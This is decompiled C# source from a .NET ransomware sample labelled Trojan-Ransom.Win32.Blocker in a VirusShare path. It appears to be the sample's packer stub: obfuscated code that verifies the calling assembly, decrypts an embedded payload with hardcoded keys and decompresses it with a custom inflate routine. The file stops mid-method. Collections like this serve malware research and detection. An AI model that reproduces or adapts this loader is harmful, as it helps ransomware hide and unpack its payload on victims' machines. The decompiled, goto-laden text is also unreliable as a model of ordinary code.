// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Server.packed, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 712FD340-1A8D-4ADA-8620-0D072E5BB482
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bipa-183abe361833d2ddb4e38325acbbb19715b5270dec52a0eb9bb6b99cfb8f1470.exe

using \u0001;
using \u0005;
using \u0008;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0001
{
  internal sealed class \u0006
  {
    private static bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
label_0:
      byte[] publicKey1 = obj0.GetName().GetPublicKey();
      byte[] publicKey2 = obj1.GetName().GetPublicKey();
label_17:
      int num1 = publicKey2 == null ? 1 : 0;
      int num2;
      int num3;
      if (true)
      {
        num3 = publicKey1 == null ? 1 : 0;
        num2 = num1;
      }
      else
        goto label_14;
label_3:
      int index;
      if (num2 != num3)
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num2 = num4;
      }
      else if (publicKey2 != null)
      {
        index = 0;
        if (false)
          goto label_0;
        else
          goto label_15;
      }
      else
        goto label_16;
label_9:
      num3 = (int) publicKey1[index];
      if (true)
      {
        if (num2 != num3)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_17;
      }
      else
        goto label_3;
label_14:
      index = num1;
label_15:
      if (index < publicKey2.Length)
      {
        num2 = (int) publicKey2[index];
        goto label_9;
      }
label_16:
      return true;
    }

    public static unsafe byte[] \u0001([In] byte[] obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      if (true)
        goto label_47;
label_7:
      \u0006.\u0007 obj1;
      *(int*) ((IntPtr) voidPtr + 12) = obj1.\u0002();
      byte[] numArray1;
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 16) = obj1.\u0001();
        *(int*) ((IntPtr) voidPtr + 20) = obj1.\u0001();
        if (*(int*) ((IntPtr) voidPtr + 16) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 16)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 16));
        }
        if (*(int*) ((IntPtr) voidPtr + 20) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 20)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 20));
        }
        long length = obj1.Length;
        if (true)
        {
          long position = obj1.Position;
          length -= position;
        }
        byte[] buffer1 = new byte[length];
        obj1.Read(buffer1, 0, buffer1.Length);
        \u0006.\u0001 obj2 = new \u0006.\u0001(buffer1);
        numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 12)];
        obj2.\u0001(numArray1, 0, numArray1.Length);
        goto label_46;
      }
label_23:
      byte[] numArray2 = new byte[8]
      {
        (byte) 86,
        (byte) 93,
        (byte) 127,
        (byte) 150,
        (byte) 232,
        (byte) 219,
        (byte) 233,
        (byte) 217
      };
      \u0001.\u0005 obj3 = new \u0001.\u0005();
      byte[] numArray3;
      try
      {
        if (true)
        {
          using (ICryptoTransform cryptoTransform = obj3.\u0001(numArray3, numArray2, true))
            numArray1 = \u0006.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
        }
      }
      finally
      {
        while (obj3 != null)
        {
          if (true)
          {
            ((IDisposable) obj3).Dispose();
            break;
          }
        }
      }
label_34:
      if (*(int*) ((IntPtr) voidPtr + 24) == 3)
      {
        byte[] numArray4 = new byte[16]
        {
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1
        };
        byte[] numArray5 = new byte[16]
        {
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2
        };
        using (\u0002 obj4 = new \u0002())
        {
          if (true)
          {
            using (ICryptoTransform cryptoTransform = obj4.\u0001(numArray4, numArray5, true))
              numArray1 = \u0006.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
          }
        }
      }
label_46:
      obj1.Close();
      return numArray1;
label_47:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u0006.\u0001(executingAssembly, callingAssembly))
        return (byte[]) null;
      obj1 = new \u0006.\u0007(obj0);
      numArray1 = new byte[0];
      *(int*) voidPtr = obj1.\u0002();
      if (*(int*) voidPtr == 67324752)
      {
        *(short*) ((IntPtr) voidPtr + 44) = (short) obj1.\u0001();
        *(int*) ((IntPtr) voidPtr + 4) = obj1.\u0001();
      }
      else
        goto label_15;
label_4:
      *(int*) ((IntPtr) voidPtr + 8) = obj1.\u0001();
      if (*(int*) voidPtr != 67324752 || *(short*) ((IntPtr) voidPtr + 44) != (short) 20 || *(int*) ((IntPtr) voidPtr + 4) != 0 || *(int*) ((IntPtr) voidPtr + 8) != 8)
        throw new FormatException("Wrong Header Signature");
      obj1.\u0002();
      obj1.\u0002();
      obj1.\u0002();
      goto label_7;
label_15:
      *(int*) ((IntPtr) voidPtr + 24) = *(int*) voidPtr >> 24;
      *(int*) voidPtr = *(int*) voidPtr - (*(int*) ((IntPtr) voidPtr + 24) << 24);
      if (*(int*) voidPtr != 8223355)
        throw new FormatException("Unknown Header");
      if (true)
      {
        if (*(int*) ((IntPtr) voidPtr + 24) == 1)
        {
          *(int*) ((IntPtr) voidPtr + 28) = obj1.\u0002();
          numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 28)];
          *(int*) ((IntPtr) voidPtr + 32) = 0;
          while (*(int*) ((IntPtr) voidPtr + 32) < *(int*) ((IntPtr) voidPtr + 28))
          {
            *(int*) ((IntPtr) voidPtr + 36) = obj1.\u0002();
            *(int*) ((IntPtr) voidPtr + 40) = obj1.\u0002();
            byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 36)];
            obj1.Read(buffer, 0, buffer.Length);
            new \u0006.\u0001(buffer).\u0001(numArray1, *(int*) ((IntPtr) voidPtr + 32), *(int*) ((IntPtr) voidPtr + 40));
            *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) + *(int*) ((IntPtr) voidPtr + 40);
          }
        }
        if (*(int*) ((IntPtr) voidPtr + 24) == 2)
        {
          numArray3 = new byte[8]
          {
            (byte) 230,
            (byte) 65,
            (byte) 213,
            (byte) 210,
            (byte) 9,
            (byte) 181,
            (byte) 46,
            (byte) 69
          };
          goto label_23;
        }
        else
          goto label_34;
      }
      else
        goto label_4;
    }

    internal sealed class \u0001
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private static readonly int[] \u0003;
      private static readonly int[] \u0004;
      private int \u0001;
      private int \u0002;
      private int \u0003;
      private int \u0004;
      private int \u0005;
      private bool \u0001;
      private \u0006.\u0002 \u0001;
      private \u0006.\u0003 \u0001;
      private \u0006.\u0005 \u0001;
      private \u0006.\u0004 \u0001;
      private \u0006.\u0004 \u0002;

      public \u0001([In] byte[] obj0)
      {
        this.\u0001 = new \u0006.\u0002();
        this.\u0001 = new \u0006.\u0003();
        this.\u0001 = 2;
        this.\u0001.\u0001(obj0, 0, obj0.Length);
      }

      private unsafe bool \u0001()
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(12);
        int num1 = this.\u0001.\u0001();
        while (true)
        {
          int index1;
          while (num1 >= 258)
          {
            *(int*) ((IntPtr) voidPtr + 8) = this.\u0001;
            switch (*(int*) ((IntPtr) voidPtr + 8))
            {
              case 7:
                int num2 = this.\u0001.\u0001(this.\u0001);
                if (true)
                {
                  index1 = num2;
                  int num3;
                  for (int index2 = num2 & -256; index2 == 0; index2 = num3)
                  {
                    this.\u0001.\u0001(index1);
                    num3 = num1;
                    if (true)
                    {
                      if ((num1 = num3 - 1) < 258)
                        return true;
                      goto case 7;
                    }
                  }
                  int num4 = index1;
                  num2 = 257;
                  num2 = num4;
                }
                if (num2 < num2)
                {
                  if (index1 < 0)
                    return false;
                  this.\u0002 = (\u0006.\u0004) null;
                  this.\u0001 = (\u0006.\u0004) null;
                  this.\u0001 = 2;
                  return true;
                }
                this.\u0003 = \u0006.\u0001.\u0001[index1 - 257];
                this.\u0002 = \u0006.\u0001.\u0002[index1 - 257];
                goto case 8;
              case 8:
                if (this.\u0002 > 0)
                {
                  this.\u0001 = 8;
                  if (true)
                  {
                    *(int*) voidPtr = this.\u0001.\u0001(this.\u0002);
                    if (*(int*) voidPtr < 0)
                      return false;
                    this.\u0001.\u0001(this.\u0002);
                    this.\u0003 += *(int*) voidPtr;
                  }
                  else
                    goto label_21;
                }
                this.\u0001 = 9;
                goto case 9;
              case 9:
                index1 = this.\u0002.\u0001(this.\u0001);
                goto label_20;
              case 10:
                goto label_23;
              default:
                continue;
            }
          }
          goto label_29;
label_20:
          if (index1 >= 0)
          {
            this.\u0004 = \u0006.\u0001.\u0003[index1];
            this.\u0002 = \u0006.\u0001.\u0004[index1];
          }
          else
            break;
label_23:
          if (this.\u0002 > 0)
          {
            this.\u0001 = 10;
            *(int*) ((IntPtr) voidPtr + 4) = this.\u0001.\u0001(this.\u0002);
            if (*(int*) ((IntPtr) voidPtr + 4) >= 0)
            {
              this.\u0001.\u0001(this.\u0002);
              this.\u0004 += *(int*) ((IntPtr) voidPtr + 4);
            }
            else
              goto label_25;
          }
          this.\u0001.\u0001(this.\u0003, this.\u0004);
          num1 -= this.\u0003;
          this.\u0001 = 7;
          continue;
label_29:
          if (false)
            goto label_20;
          else
            goto label_30;
        }
label_21:
        return false;
label_25:
        return false;
label_30:
        return true;
      }

      private unsafe bool \u0002()
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(12);
        switch (this.\u0001)
        {
          case 2:
            if (this.\u0001)
            {
              this.\u0001 = 12;
              return false;
            }
            *(int*) voidPtr = this.\u0001.\u0001(3);
            if (*(int*) voidPtr < 0)
              return false;
            break;
          case 3:
            if ((this.\u0005 = this.\u0001.\u0001(16)) >= 0)
            {
              this.\u0001.\u0001(16);
              goto label_18;
            }
            else
              goto label_15;
          case 4:
label_19:
            *(int*) ((IntPtr) voidPtr + 4) = this.\u0001.\u0001(16);
            int num1 = *(int*) ((IntPtr) voidPtr + 4);
            if (false)
              return num1 != 0;
            if (num1 < 0)
            {
              if (true)
                return false;
              goto case 3;
            }
            else
              goto label_23;
          case 5:
label_24:
            *(int*) ((IntPtr) voidPtr + 8) = this.\u0001.\u0001(this.\u0001, this.\u0005);
            this.\u0005 -= *(int*) ((IntPtr) voidPtr + 8);
            if (this.\u0005 != 0)
              return !this.\u0001.\u0001();
            this.\u0001 = 2;
            if (true)
              return true;
            break;
          case 6:
            if (!this.\u0001.\u0001(this.\u0001))
              return false;
            this.\u0001 = this.\u0001.\u0001();
            this.\u0002 = this.\u0001.\u0002();
            this.\u0001 = 7;
            goto case 7;
          case 7:
          case 8:
          case 9:
          case 10:
            return this.\u0001();
          case 12:
            return false;
          default:
            return false;
        }
        this.\u0001.\u0001(3);
        if ((*(int*) voidPtr & 1) != 0)
          this.\u0001 = true;
        int num2 = *(int*) voidPtr;
label_6:
        switch (num2 >> 1)
        {
          case 0:
            this.\u0001.\u0001();
            this.\u0001 = 3;
            break;
          case 1:
            this.\u0001 = \u0006.\u0004.\u0001;
            this.\u0002 = \u0006.\u0004.\u0002;
            this.\u0001 = 7;
            if (true)
            {
              if (true)
              {
                if (false)
                  goto label_23;
                else
                  break;
              }
              else
                goto label_15;
            }
            else
              goto label_18;
          case 2:
            this.\u0001 = new \u0006.\u0005();
            this.\u0001 = 6;
            break;
        }
        return true;
label_15:
        int num3 = 0;
        if (num3 == 0)
          return num3 != 0;
        num2 = num3;
        goto label_6;
label_18:
        this.\u0001 = 4;
        goto label_19;
label_23:
        this.\u0001.\u0001(16);
        this.\u0001 = 5;
        goto label_24;
      }

      public unsafe int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(8);
        *(int*) voidPtr = 0;
        int num1;
        int num2;
        do
        {
          num1 = this.\u0001;
          num2 = 11;
          if (num2 != 0)
          {
            if (num1 != num2)
              goto label_8;
label_3:
            if (!this.\u0002())
            {
              int num3 = this.\u0001.\u0002();
              num2 = 0;
              num1 = num3;
              goto label_5;
            }
            else
              continue;
label_8:
            *(int*) ((IntPtr) voidPtr + 4) = this.\u0001.\u0001(obj0, obj1, obj2);
            obj1 += *(int*) ((IntPtr) voidPtr + 4);
            *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
            obj2 -= *(int*) ((IntPtr) voidPtr + 4);
            if (obj2 != 0)
              goto label_3;
            else
              goto label_2;
          }
label_5:;
        }
        while (num1 > num2 && this.\u0001 != 11);
        goto label_6;
label_2:
        return *(int*) voidPtr;
label_6:
        return *(int*) voidPtr;
      }

      static \u0001()
      {
label_0:
        int length1 = 29;
        while (true)
        {
          int[] numArray1 = new int[length1];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0003.\u0001));
          \u0006.\u0001.\u0001 = numArray1;
          while (true)
          {
            \u0006.\u0001.\u0002 = new int[29]
            {
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              1,
              1,
              1,
              1,
              2,
              2,
              2,
              2,
              3,
              3,
              3,
              3,
              4,
              4,
              4,
              4,
              5,
              5,
              5,
              5,
              0
            };
            if (true)
            {
              \u0006.\u0001.\u0003 = new int[30]
              {
                1,
                2,
                3,
                4,
                5,
                7,
                9,
                13,
                17,
                25,
                33,
                49,
                65,
                97,
                129,
                193,
                257,
                385,
                513,
                769,
                1025,
                1537,
                2049,
                3073,
                4097,
                6145,
                8193,
                12289,
                16385,
                24577
              };
              goto label_5;
            }
          }
          goto label_7;
label_5:
          int length2 = 30;
          if (length2 == 0)
          {
            length1 = length2;
            continue;
          }
          int[] numArray2 = new int[length2];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u0003.\u0001));
          \u0006.\u0001.\u0004 = numArray2;
label_7:
          if (true)
          {
            if (false)
              goto label_5;
            else
              break;
          }
          else
            goto label_0;
        }
      }
    }

    internal sealed class \u0002
    {
      private byte[] \u0001;
      private int \u0001 = 0;
      private int \u0002 = 0;
      private uint \u0001 = 0;
      private int \u0003 = 0;

      public int \u0001([In] int obj0)
      {
        while (this.\u0003 < obj0)
        {
          if (this.\u0001 == this.\u0002)
          {
            if (true)
            {
              if (true)
                return -1;
            }
            else
              break;
          }
          else if (true)
          {
            \u0006.\u0002 obj1 = this;
            int num1 = (int) obj1.\u0001;
            byte[] numArray1 = this.\u0001;
            \u0006.\u0002 obj2 = this;
            int num2;
            int num3 = num2 = obj2.\u0001;
            obj2.\u0001 = num2 + 1;
            int index1 = num3;
            int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
            byte[] numArray2 = this.\u0001;
            \u0006.\u0002 obj3 = this;
            int num5;
            int num6 = num5 = obj3.\u0001;
            obj3.\u0001 = num5 + 1;
            int index2 = num6;
            int num7 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
            int num8 = (num4 | num7) << this.\u0003;
            obj1.\u0001 = (uint) (num1 | num8);
          }
          else
            continue;
          this.\u0003 += 16;
          break;
        }
        long num9 = (long) this.\u0001;
        int num10 = 1;
        int num11 = obj0;
        int num12;
        do
        {
          if (true)
          {
            int num13 = num11 & 31;
            num12 = num10 << num13;
            if (true)
            {
              num11 = 1;
              num10 = num12;
            }
            else
              goto label_15;
          }
        }
        while (num11 == 0);
        int num14 = num10 - num11;
        goto label_13;
label_15:
        num14 = num12;
label_13:
        long num15 = (long) num14;
        return (int) (num9 & num15);
      }

      public void \u0001([In] int obj0)
      {
label_0:
        this.\u0001 >>= obj0;
        do
        {
          if (true)
            this.\u0003 -= obj0;
          else
            goto label_0;
        }
        while (false);
      }

      [SpecialName]
      public int \u0001() => this.\u0003;

      [SpecialName]
      public int \u0002()
      {
        int num1 = this.\u0002;
        int num2;
        int num3;
        while (true)
        {
          num2 = this.\u0001;
          if (true)
          {
            num3 = num1 - num2;
            if (false)
              num1 = num3;
            else
              goto label_7;
          }
          else
            break;
        }
label_2:
        do
        {
          if (true)
            num2 >>= 3;
        }
        while (false);
        return num1 + num2;
label_7:
        num2 = this.\u0003;
        num1 = num3;
        goto label_2;
      }

      public void \u0001()
      {
        this.\u0001 >>= this.\u0003 & 7;
        this.\u0003 &= -8;
      }

      [SpecialName]
      public bool \u0001() => this.\u0001 == this.\u0002;

      public unsafe int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(8);
        *(int*) voidPtr = 0;
        int num1;
        int num2;
        int num3;
        while (true)
        {
          int num4 = this.\u0003;
          int num5 = 0;
          while (true)
          {
            if (num5 == 0)
            {
              if (num4 <= num5 || obj2 <= 0)
              {
                if (obj2 != 0)
                {
                  *(int*) ((IntPtr) voidPtr + 4) = this.\u0002 - this.\u0001;
                  int num6 = obj2;
                  num5 = *(int*) ((IntPtr) voidPtr + 4);
                  num4 = num6;
                }
                else
                  break;
              }
              else
                goto label_21;
            }
            if (num4 > num5)
              obj2 = *(int*) ((IntPtr) voidPtr + 4);
            do
            {
              Array.Copy((Array) this.\u0001, this.\u0001, (Array) obj0, obj1, obj2);
            }
            while (false);
            this.\u0001 += obj2;
            num1 = this.\u0001;
            if (true)
            {
              int num7 = this.\u0002;
              num2 = num1 - num7;
              num3 = 1;
              if (num3 == 0)
              {
                num5 = num3;
                num4 = num2;
              }
              else
                goto label_15;
            }
            else
              goto label_20;
          }
          if (false)
            goto label_22;
          else
            break;
label_21:
          obj0[obj1++] = (byte) this.\u0001;
          if (true)
          {
            this.\u0001 >>= 8;
            this.\u0003 -= 8;
            --obj2;
          }
          else
            goto label_16;
label_22:
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        return *(int*) voidPtr;
label_15:
        if ((num2 & num3) == 0)
          goto label_19;
label_16:
        if (true)
          this.\u0001 = (uint) this.\u0001[this.\u0001++] & (uint) byte.MaxValue;
        this.\u0003 = 8;
label_19:
        num1 = *(int*) voidPtr;
label_20:
        int num8 = obj2;
        return num1 + num8;
      }

      public void \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        if (true)
          goto label_6;
label_4:
        this.\u0003 += 8;
label_5:
        this.\u0001 = obj0;
        this.\u0001 = obj1;
        int num;
        this.\u0002 = num;
        return;
label_6:
        if (this.\u0001 < this.\u0002)
          throw new InvalidOperationException();
        num = obj1 + obj2;
        if (0 > obj1 || obj1 > num || num > obj0.Length)
          throw new ArgumentOutOfRangeException();
        if ((obj2 & 1) != 0)
        {
          this.\u0001 |= (uint) (((int) obj0[obj1++] & (int) byte.MaxValue) << this.\u0003);
          goto label_4;
        }
        else
          goto label_5;
      }
    }

    internal sealed class \u0003
    {
      private byte[] \u0001 = new byte[32768];
      private int \u0001 = 0;
      private int \u0002 = 0;

      public void \u0001([In] int obj0)
      {
label_0:
        do
        {
          \u0006.\u0003 obj1 = this;
          int num1;
          int num2 = num1 = obj1.\u0002;
          obj1.\u0002 = num1 + 1;
          do
          {
            if (true)
            {
              if (num2 != 32768)
                goto label_3;
label_2:
              goto label_0;
label_3:
              if (true)
              {
                byte[] numArray = this.\u0001;
                \u0006.\u0003 obj2 = this;
                int num3;
                num2 = num3 = obj2.\u0001;
                obj2.\u0001 = num3 + 1;
                int index = num2;
                int num4 = (int) (byte) obj0;
                numArray[index] = (byte) num4;
                if (false)
                  goto label_2;
              }
              else
                goto label_0;
            }
            else
              goto label_0;
          }
          while (false);
          goto label_5;
        }
        while (false);
        goto label_7;
label_5:
        this.\u0001 &= (int) short.MaxValue;
        return;
label_7:
        throw new InvalidOperationException();
      }

      private void \u0001([In] int obj0, [In] int obj1, [In] int obj2)
      {
        if (false)
          return;
        while (true)
        {
          int num1 = obj1;
          int num2;
          while (true)
          {
            num2 = num1 - 1;
            if (false)
              num1 = num2;
            else
              break;
          }
          obj1 = num2;
          if (num1 > 0)
          {
            byte[] numArray = this.\u0001;
            \u0006.\u0003 obj = this;
            int num3;
            int num4 = num3 = obj.\u0001;
            obj.\u0001 = num3 + 1;
            int index = num4;
            int num5 = (int) this.\u0001[obj0++];
            numArray[index] = (byte) num5;
            this.\u0001 &= (int) short.MaxValue;
            int num6 = obj0;
            if (true)
              num6 &= (int) short.MaxValue;
            obj0 = num6;
          }
          else
            break;
        }
      }

      public void \u0001([In] int obj0, [In] int obj1)
      {
        if ((this.\u0002 += obj0) > 32768)
          throw new InvalidOperationException();
        int sourceIndex = this.\u0001 - obj1 & (int) short.MaxValue;
        int num = 32768 - obj0;
        if (sourceIndex <= num && this.\u0001 < num)
        {
          if (obj0 <= obj1)
          {
            Array.Copy((Array) this.\u0001, sourceIndex, (Array) this.\u0001, this.\u0001, obj0);
            this.\u0001 += obj0;
          }
          else
          {
            while (obj0-- > 0)
              this.\u0001[this.\u0001++] = this.\u0001[sourceIndex++];
          }
        }
        else
          this.\u0001(sourceIndex, obj0, obj1);
      }

      public unsafe int \u0001([In] \u0006.\u0002 obj0, [In] int obj1)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(8);
        int val1 = obj1;
        int val2 = 32768;
        if (val2 != 0)
          val2 -= this.\u0002;
        obj1 = Math.Min(Math.Min(val1, val2), obj0.\u0002());
        *(int*) ((IntPtr) voidPtr + 4) = 32768 - this.\u0001;
        if (obj1 > *(int*) ((IntPtr) voidPtr + 4))
        {
          *(int*) voidPtr = obj0.\u0001(this.\u0001, this.\u0001, *(int*) ((IntPtr) voidPtr + 4));
          if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
            *(int*) voidPtr = *(int*) voidPtr + obj0.\u0001(this.\u0001, 0, obj1 - *(int*) ((IntPtr) voidPtr + 4));
        }
        else
          *(int*) voidPtr = obj0.\u0001(this.\u0001, this.\u0001, obj1);
        this.\u0001 = this.\u0001 + *(int*) voidPtr & (int) short.MaxValue;
        this.\u0002 += *(int*) voidPtr;
        return *(int*) voidPtr;
      }

      public int \u0001() => 32768 - this.\u0002;

      public int \u0002() => this.\u0002;

      public unsafe int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(12);
        int num1;
        int num2;
        do
        {
          *(int*) voidPtr = this.\u0001;
          num1 = obj2;
          num2 = this.\u0002;
          if (true)
          {
            if (true)
            {
              if (num1 <= num2)
                goto label_17;
              else
                goto label_16;
label_4:
              *(int*) ((IntPtr) voidPtr + 4) = obj2;
              continue;
label_16:
              obj2 = this.\u0002;
              goto label_4;
label_17:
              *(int*) voidPtr = this.\u0001 - this.\u0002 + obj2 & (int) short.MaxValue;
              goto label_4;
            }
            else
              goto label_10;
          }
          else
            goto label_12;
        }
        while (false);
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = obj2 - *(int*) voidPtr;
          int num3 = *(int*) ((IntPtr) voidPtr + 8);
          int num4 = 0;
          if (num4 == 0)
          {
            if (num3 > num4)
              Array.Copy((Array) this.\u0001, 32768 - *(int*) ((IntPtr) voidPtr + 8), (Array) obj0, obj1, *(int*) ((IntPtr) voidPtr + 8));
            else
              goto label_11;
          }
          else
          {
            num2 = num4;
            num1 = num3;
            goto label_10;
          }
        }
        int num5 = obj1;
        num2 = *(int*) ((IntPtr) voidPtr + 8);
        num1 = num5;
label_10:
        obj1 = num1 + num2;
        obj2 = *(int*) voidPtr;
label_11:
        Array.Copy((Array) this.\u0001, *(int*) voidPtr - obj2, (Array) obj0, obj1, obj2);
        this.\u0002 -= *(int*) ((IntPtr) voidPtr + 4);
        int num6 = this.\u0002;
        num2 = 0;
        num1 = num6;
label_12:
        if (num1 < num2)
          throw new InvalidOperationException();
        return *(int*) ((IntPtr) voidPtr + 4);
      }
    }

    internal sealed class \u0004
    {
      private short[] \u0001;
      public static readonly \u0006.\u0004 \u0001;
      public static readonly \u0006.\u0004 \u0002;

      static \u0004()
      {
        byte[] numArray = new byte[288];
label_1:
        int num1;
        while (true)
        {
          if (true)
            goto label_18;
label_3:
          if (true)
          {
            while (num1 < 144)
              numArray[num1++] = (byte) 8;
            if (true)
            {
              for (; num1 < 256; numArray[num1++] = (byte) 9)
              {
                if (false)
                  goto label_1;
              }
              goto label_7;
            }
            else
              break;
          }
          else
            goto label_10;
label_18:
          num1 = 0;
          goto label_3;
        }
        goto label_12;
label_7:
        int num2;
        int num3;
        while (true)
        {
          num2 = num1;
          num3 = 280;
          if (num3 != 0)
          {
            if (num2 < num3)
              numArray[num1++] = (byte) 7;
            else
              goto label_10;
          }
          else
            break;
        }
        int num4 = num3;
        int num5 = num2;
        goto label_15;
label_10:
        while (num1 < 288)
          numArray[num1++] = (byte) 8;
        \u0006.\u0004.\u0001 = new \u0006.\u0004(numArray);
        numArray = new byte[32];
label_12:
        num1 = 0;
label_14:
        num5 = num1;
        num4 = 32;
label_15:
        if (num5 < num4)
        {
          numArray[num1++] = (byte) 5;
          goto label_14;
        }
        else if (true)
          \u0006.\u0004.\u0002 = new \u0006.\u0004(numArray);
        else
          goto label_7;
      }

      public \u0004([In] byte[] obj0) => this.\u0001(obj0);

      private unsafe void \u0001([In] byte[] obj0)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(68);
        int[] numArray1 = new int[16];
        int[] numArray2 = new int[16];
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < obj0.Length)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) obj0[*(int*) voidPtr];
          if (*(int*) ((IntPtr) voidPtr + 4) > 0)
          {
            int[] numArray3;
            int index;
            int num = (numArray3 = numArray1)[(IntPtr) (index = *(int*) ((IntPtr) voidPtr + 4))] + 1;
            numArray3[index] = num;
          }
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        *(int*) ((IntPtr) voidPtr + 12) = 512;
        *(int*) ((IntPtr) voidPtr + 16) = 1;
        while (*(int*) ((IntPtr) voidPtr + 16) <= 15)
        {
          numArray2[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 8);
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (numArray1[*(int*) ((IntPtr) voidPtr + 16)] << 16 - *(int*) ((IntPtr) voidPtr + 16));
          if (*(int*) ((IntPtr) voidPtr + 16) >= 10)
          {
            *(int*) ((IntPtr) voidPtr + 20) = numArray2[*(int*) ((IntPtr) voidPtr + 16)] & 130944;
            *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (*(int*) ((IntPtr) voidPtr + 24) - *(int*) ((IntPtr) voidPtr + 20) >> 16 - *(int*) ((IntPtr) voidPtr + 16));
          }
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
        }
        this.\u0001 = new short[*(int*) ((IntPtr) voidPtr + 12)];
        *(int*) ((IntPtr) voidPtr + 28) = 512;
        *(int*) ((IntPtr) voidPtr + 32) = 15;
        if (true)
          goto label_15;
label_12:
        *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
        *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 128;
label_13:
        if (*(int*) ((IntPtr) voidPtr + 44) < *(int*) ((IntPtr) voidPtr + 36))
        {
          this.\u0001[(int) \u0006.\u0006.\u0001(*(int*) ((IntPtr) voidPtr + 44))] = (short) (-*(int*) ((IntPtr) voidPtr + 28) << 4 | *(int*) ((IntPtr) voidPtr + 32));
          goto label_12;
        }
        else
          *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
label_15:
        if (*(int*) ((IntPtr) voidPtr + 32) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 36) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
          *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 40);
          goto label_13;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 48) = 0;
          while (*(int*) ((IntPtr) voidPtr + 48) < obj0.Length)
          {
            *(int*) ((IntPtr) voidPtr + 52) = (int) obj0[*(int*) ((IntPtr) voidPtr + 48)];
            if (*(int*) ((IntPtr) voidPtr + 52) != 0)
            {
              *(int*) ((IntPtr) voidPtr + 8) = numArray2[*(int*) ((IntPtr) voidPtr + 52)];
